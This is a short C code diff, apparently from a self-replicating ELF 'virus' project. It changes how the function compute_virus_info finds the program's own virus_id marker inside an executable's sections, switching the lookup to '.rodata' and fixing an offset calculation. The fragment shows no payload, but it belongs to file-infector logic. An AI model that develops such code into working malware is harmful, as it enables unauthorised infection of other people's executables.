@@ -147,12 +147,12 @@ static virus_info_t compute_virus_info_##N(FILE *file) {
                     }
 
                     assert(section_header.sh_name < (size_t) section_name_table_size);
-                    static const char virus_id_name[] = ".virus_id";
-                    if (strncmp(virus_id_name,
+                    static const char rodata_name[] = ".rodata";
+                    if (strncmp(rodata_name,
                                 section_names + section_header.sh_name,
-                                sizeof(virus_id_name)) == 0) {
+                                sizeof(rodata_name)) == 0) {
                         assert((uintptr_t) &virus_id >= section_header.sh_addr);
-                        off_t diff = section_header.sh_addr - (uintptr_t) &virus_id;
+                        off_t diff = ((uintptr_t) &virus_id) - section_header.sh_addr;
                         info.id_offset = section_header.sh_offset + diff;
                     }
                     break;
